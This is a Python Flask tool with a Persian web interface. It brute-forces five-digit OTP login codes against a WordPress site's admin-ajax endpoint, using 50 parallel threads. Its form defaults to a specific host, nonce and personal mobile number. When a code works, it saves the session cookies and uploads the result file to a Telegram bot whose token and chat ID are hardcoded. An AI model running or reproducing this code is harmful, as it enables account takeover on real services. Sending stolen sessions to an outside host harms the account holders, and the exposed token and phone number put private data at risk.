import requests
import json
from http.cookiejar import MozillaCookieJar
from concurrent.futures import ThreadPoolExecutor
import time
import sys
from flask import Flask, render_template_string
from flask_socketio import SocketIO, emit
import threading

# تنظیمات تلگرام (اینجا توکن و آیدی چتت رو بذار)
TELEGRAM_BOT_TOKEN = "5858689331:AAH3pdfEDVSIF9AaPsWCGQiZzltgkKVtKr8"  # توکن رباتت رو اینجا بذار
TELEGRAM_CHAT_ID = "102046811"     # آیدی چتت رو اینجا بذار

app = Flask(__name__)
socketio = SocketIO(app, async_mode='eventlet')

# متغیرهای گلوبال برای کنترل پروسه
running = False
found_success = False
progress_log = []

def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        response = requests.post(url, data=data, files=files)
        if response.status_code == 200:
            progress_log.append(f"File {file_path} sent to Telegram successfully!")
        else:
            progress_log.append(f"Failed to send file to Telegram: {response.text}")
    socketio.emit('update_progress', {'log': progress_log[-1]})

def send_request(host, login_otp_nonce, mobile, code_values, counter, max_retries=5):
    headers = {
        "Host": host,
        "Sec-Ch-Ua-Platform": "\"Windows\"",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Ch-Ua": "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": f"https://{host}",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": f"https://{host}/login/?action=login-by-otp&mobile={mobile}",
        "Priority": "u=1, i"
    }

    data = {
        "login_otp_nonce": login_otp_nonce,
        "_wp_http_referer": f"/login/?action=login-by-otp&mobile={mobile}",
        "action": "kandopanel_login_by_otp",
        "mobile": mobile,
        "code[1]": str(code_values[0]),
        "code[2]": str(code_values[1]),
        "code[3]": str(code_values[2]),
        "code[4]": str(code_values[3]),
        "code[5]": str(code_values[4])
    }

    url = f"https://{host}/wp-admin/admin-ajax.php"
    code_str = ''.join(map(str, code_values))

    for attempt in range(max_retries + 1):
        try:
            response = requests.post(url, headers=headers, data=data, timeout=15)
            response.raise_for_status()

            try:
                json_response = response.json()
                if json_response.get("success"):
                    msg = (f"Success with code {code_str} (number {counter})!\n"
                           f"Message: {json_response['data']['message']}\n"
                           f"Redirect to: {json_response['data']['redirect']}")
                    progress_log.append(msg)
                    socketio.emit('update_progress', {'log': msg})

                    cookie_jar = MozillaCookieJar(f"cookies_success_{code_str}.txt")
                    for cookie in response.cookies:
                        cookie_jar.set_cookie(cookie)
                    cookie_jar.save(ignore_discard=True, ignore_expires=True)
                    progress_log.append(f"Cookies saved in cookies_success_{code_str}.txt")
                    socketio.emit('update_progress', {'log': progress_log[-1]})

                    output_file = f"success_{code_str}.txt"
                    with open(output_file, 'w', encoding='utf-8') as f:
                        f.write(msg + f"\nCookies file: cookies_success_{code_str}.txt\n")
                    progress_log.append(f"Output saved in {output_file}")
                    socketio.emit('update_progress', {'log': progress_log[-1]})

                    send_file_to_telegram(output_file)
                    return True
                else:
                    progress_log.append(f"Failed with code {code_str} (number {counter}): {json_response}")
                    socketio.emit('update_progress', {'log': progress_log[-1]})
                    return False
            except json.JSONDecodeError:
                progress_log.append(f"Error parsing JSON for code {code_str} (number {counter})")
                socketio.emit('update_progress', {'log': progress_log[-1]})
                return False
        except requests.exceptions.RequestException as e:
            progress_log.append(f"Network error with code {code_str} (attempt {attempt + 1}/{max_retries + 1}): {str(e)}")
            socketio.emit('update_progress', {'log': progress_log[-1]})
            if attempt < max_retries:
                time.sleep(2)
                continue
            return False

def generate_code(counter):
    code_str = f"{counter:05d}"
    return [int(digit) for digit in code_str]

def run_bruteforce(host, login_otp_nonce, mobile, connections, start_range, end_range):
    global running, found_success
    batch_size = connections
    found_success = False

    for batch_start in range(start_range, end_range, batch_size):
        if not running or found_success:
            break

        batch_end = min(batch_start + batch_size, end_range)
        codes = [generate_code(i) for i in range(batch_start, batch_end)]

        with ThreadPoolExecutor(max_workers=connections) as executor:
            futures = {
                executor.submit(send_request, host, login_otp_nonce, mobile, code, batch_start + idx + 1): idx
                for idx, code in enumerate(codes)
            }

            for future in futures:
                try:
                    if future.result():
                        found_success = True
                        running = False
                        progress_log.append("Process stopped because a successful code was found!")
                        socketio.emit('update_progress', {'log': progress_log[-1]})
                        break
                except Exception as e:
                    progress_log.append(f"Exception in future: {str(e)}")
                    socketio.emit('update_progress', {'log': progress_log[-1]})

        if not found_success:
            time.sleep(1)

    if not found_success:
        progress_log.append(f"No successful code found in range {start_range:05d}-{end_range:05d}.")
        socketio.emit('update_progress', {'log': progress_log[-1]})

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa">
    <head>
        <meta charset="UTF-8">
        <title>بررسی کد OTP</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
        <style>
            body { direction: rtl; font-family: Arial, sans-serif; }
            #progress { height: 300px; overflow-y: auto; }
        </style>
    </head>
    <body class="bg-gray-100 p-6">
        <div class="max-w-2xl mx-auto bg-white p-6 rounded-lg shadow-lg">
            <h1 class="text-2xl font-bold text-center mb-6">بررسی کد OTP</h1>
            <form id="form" class="space-y-4">
                <div>
                    <label class="block text-sm font-medium text-gray-700">هاست:</label>
                    <input type="text" id="host" class="mt-1 block w-full p-2 border rounded" value="www.arzanpanel-iran.com">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">Nonce:</label>
                    <input type="text" id="nonce" class="mt-1 block w-full p-2 border rounded" value="9d6178e07d">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
                    <input type="text" id="mobile" class="mt-1 block w-full p-2 border rounded" value="09039495749">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
                    <input type="number" id="connections" class="mt-1 block w-full p-2 border rounded" value="50">
                </div>
                <div>
                    <label class="block text-sm font-medium text-gray-700">محدوده شروع و پایان:</label>
                    <div class="space-y-2">
                        <label><input type="radio" name="range" value="0-10000" checked> 00000 تا 10000</label>
                        <label><input type="radio" name="range" value="10000-20000"> 10000 تا 20000</label>
                        <label><input type="radio" name="range" value="20000-30000"> 20000 تا 30000</label>
                        <label><input type="radio" name="range" value="30000-40000"> 30000 تا 40000</label>
                        <label><input type="radio" name="range" value="40000-50000"> 40000 تا 50000</label>
                    </div>
                </div>
                <div class="flex space-x-4">
                    <button type="button" id="start" class="w-full bg-green-500 text-white p-2 rounded hover:bg-green-600">شروع</button>
                    <button type="button" id="stop" class="w-full bg-red-500 text-white p-2 rounded hover:bg-red-600" disabled>توقف</button>
                </div>
            </form>
            <div class="mt-6">
                <h2 class="text-lg font-semibold">پیشرفت:</h2>
                <div id="progress" class="bg-gray-50 p-4 rounded border text-sm"></div>
            </div>
        </div>

        <script>
            const socket = io();
            const form = document.getElementById('form');
            const startBtn = document.getElementById('start');
            const stopBtn = document.getElementById('stop');
            const progressDiv = document.getElementById('progress');

            socket.on('update_progress', function(data) {
                const log = document.createElement('p');
                log.textContent = data.log;
                progressDiv.appendChild(log);
                progressDiv.scrollTop = progressDiv.scrollHeight;
            });

            startBtn.addEventListener('click', () => {
                const host = document.getElementById('host').value;
                const nonce = document.getElementById('nonce').value;
                const mobile = document.getElementById('mobile').value;
                const connections = document.getElementById('connections').value;
                const range = document.querySelector('input[name="range"]:checked').value.split('-');
                const startRange = parseInt(range[0]);
                const endRange = parseInt(range[1]);

                fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host, nonce, mobile, connections, startRange, endRange })
                }).then(() => {
                    startBtn.disabled = true;
                    stopBtn.disabled = false;
                });
            });

            stopBtn.addEventListener('click', () => {
                fetch('/stop', {
                    method: 'POST'
                }).then(() => {
                    startBtn.disabled = false;
                    stopBtn.disabled = true;
                });
            });
        </script>
    </body>
    </html>
    ''')

@app.route('/start', methods=['POST'])
def start():
    global running, progress_log
    data = request.get_json()
    host = data['host']
    login_otp_nonce = data['nonce']
    mobile = data['mobile']
    connections = int(data['connections'])
    start_range = int(data['startRange'])
    end_range = int(data['endRange'])

    running = True
    progress_log = []
    threading.Thread(target=run_bruteforce, args=(host, login_otp_nonce, mobile, connections, start_range, end_range)).start()
    return '', 204

@app.route('/stop', methods=['POST'])
def stop():
    global running
    running = False
    return '', 204

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=8181, debug=True)
